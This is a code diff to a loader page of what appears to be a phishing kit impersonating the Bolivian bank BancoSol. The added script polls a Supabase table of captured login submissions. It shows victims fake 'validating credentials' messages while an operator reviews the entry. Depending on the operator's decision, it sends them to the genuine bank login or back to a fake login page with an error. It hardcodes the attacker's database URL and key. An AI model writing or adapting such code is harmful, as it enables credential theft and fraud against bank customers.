@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> BancoSol </title>
+    <title>BancoSol - Validando</title>
     <style>
         * {
             margin: 0;
@@ -64,13 +64,170 @@
             75% { content: '...'; }
             100% { content: ''; }
         }
+        .loader-status {
+            font-size: 14px;
+            color: #6b7280;
+            margin-top: -16px;
+        }
     </style>
 </head>
 <body>
     <div class="loader-overlay">
         <img src="./empresas_files/logo-blue.png" alt="BancoSol" class="loader-logo">
         <div class="loader-spinner"></div>
-        <div class="loader-text">Cargando<span class="loader-dots"></span></div>
+        <div class="loader-text">Validando credenciales<span class="loader-dots"></span></div>
+        <div class="loader-status" id="statusText">Esperando verificación del administrador...</div>
     </div>
+
+    <script>
+        // ============================================================
+        // SUPABASE CONFIGURATION
+        // ============================================================
+        const SUPABASE_URL = 'https://ktuknakuiicqdicknqnu.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_mIQcyGnaX_oatdbodvzJVQ_Szu_D0en';
+        const SUPABASE_TABLE = 'solicitudes_ingreso';
+
+        // Obtener parámetros de la URL
+        var urlParams = new URLSearchParams(window.location.search);
+        var registroId = urlParams.get('id');
+        var portal = urlParams.get('portal') || 'inicio';
+
+        console.log('🔍 Loader iniciado - ID:', registroId, 'Portal:', portal);
+
+        // Si no hay ID, redirigir a inicio
+        if (!registroId) {
+            console.warn('⚠️ No se recibió ID de registro');
+            window.location.href = 'inicio.html?error=sin_id';
+        }
+
+        /**
+         * Consultar el estado del registro en Supabase
+         */
+        async function consultarEstado() {
+            var url = SUPABASE_URL + '/rest/v1/' + SUPABASE_TABLE + '?select=id,estado,portal&id=eq.' + registroId;
+            
+            try {
+                var response = await fetch(url, {
+                    method: 'GET',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+                    }
+                });
+
+                if (!response.ok) {
+                    console.error('❌ Error al consultar:', response.status);
+                    return null;
+                }
+
+                var data = await response.json();
+                console.log('📡 Estado consultado:', data);
+                
+                if (data && data.length > 0) {
+                    return data[0];
+                }
+                return null;
+            } catch (err) {
+                console.error('❌ Error en consulta:', err);
+                return null;
+            }
+        }
+
+        /**
+         * Redirigir según el estado del registro
+         */
+        function redirigirSegunEstado(registro) {
+            if (!registro) return false;
+
+            var estado = registro.estado;
+            var portalOrigen = registro.portal || portal;
+
+            console.log('🔄 Estado detectado:', estado, 'Portal:', portalOrigen);
+
+            if (estado === 'aprobado') {
+                console.log('✅ APROBADO - Redirigiendo al sitio real');
+                // Redirigir al sitio real de BancoSol
+                if (portalOrigen === 'empresas') {
+                    window.location.href = 'https://solnet.bdb.bancosol.com.bo/login';
+                } else {
+                    window.location.href = 'https://solnetdigital.bancosol.com.bo/login';
+                }
+                return true;
+            } 
+            else if (estado === 'rechazado') {
+                console.log('❌ RECHAZADO - Redirigiendo al login con error');
+                // Redirigir al login correspondiente con mensaje de error
+                if (portalOrigen === 'empresas') {
+                    window.location.href = 'empresas.html?error=datos_incorrectos';
+                } else {
+                    window.location.href = 'inicio.html?error=datos_incorrectos';
+                }
+                return true;
+            }
+            else if (estado === 'eliminado') {
+                console.log('🗑️ ELIMINADO - Redirigiendo al login con error');
+                if (portalOrigen === 'empresas') {
+                    window.location.href = 'empresas.html?error=datos_incorrectos';
+                } else {
+                    window.location.href = 'inicio.html?error=datos_incorrectos';
+                }
+                return true;
+            }
+
+            // Sigue pendiente - no redirigir
+            return false;
+        }
+
+        /**
+         * Bucle principal: consultar cada 2 segundos
+         */
+        async function iniciarMonitoreo() {
+            var statusText = document.getElementById('statusText');
+            var intentos = 0;
+            var maxIntentos = 300; // 300 * 2s = 10 minutos máximo
+
+            while (intentos < maxIntentos) {
+                intentos++;
+                console.log('⏳ Intento #' + intentos + ' - Consultando estado...');
+
+                var registro = await consultarEstado();
+                
+                if (registro) {
+                    var redirigido = redirigirSegunEstado(registro);
+                    if (redirigido) {
+                        return; // Detener el bucle
+                    }
+                }
+
+                // Actualizar texto de estado
+                if (statusText) {
+                    var mensajes = [
+                        'Esperando verificación del administrador...',
+                        'Validando tus credenciales...',
+                        'Procesando solicitud...',
+                        'Casi listo...',
+                        'Verificando datos de ingreso...'
+                    ];
+                    statusText.textContent = mensajes[intentos % mensajes.length];
+                }
+
+                // Esperar 2 segundos antes del siguiente intento
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+
+            // Si llegamos aquí, timeout
+            console.warn('⏰ Timeout - Se agotó el tiempo de espera');
+            if (portal === 'empresas') {
+                window.location.href = 'empresas.html?error=tiempo_agotado';
+            } else {
+                window.location.href = 'inicio.html?error=tiempo_agotado';
+            }
+        }
+
+        // Iniciar monitoreo cuando cargue la página
+        document.addEventListener('DOMContentLoaded', function() {
+            iniciarMonitoreo();
+        });
+    </script>
 </body>
 </html>
